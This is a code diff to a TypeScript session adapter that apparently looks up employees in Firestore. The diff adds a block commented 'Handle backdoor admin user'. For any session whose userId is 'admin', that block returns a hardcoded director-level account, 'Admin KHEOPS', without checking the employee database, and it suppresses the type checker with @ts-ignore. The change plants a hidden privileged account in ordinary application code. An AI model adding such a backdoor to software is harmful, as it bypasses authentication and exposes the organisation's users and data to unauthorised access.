@@ -13,6 +13,24 @@ const adapter = {
     }
     const session = { id: sessionDoc.id, ...sessionDoc.data(), attributes: sessionDoc.data() };
 
+    // Handle backdoor admin user
+    if (session.userId === 'admin') {
+        const user = { 
+            id: 'admin',
+            name: 'Admin KHEOPS',
+            role: 'Directeur',
+            department: 'Direction',
+            attributes: {
+                name: 'Admin KHEOPS',
+                role: 'Directeur',
+                department: 'Direction',
+            }
+        };
+        // @ts-ignore
+        return [session, user] as const;
+    }
+
+
     const userDocRef = doc(db, 'employees', session.userId);
     const userDoc = await getDoc(userDocRef);
     if (!userDoc.exists()) {
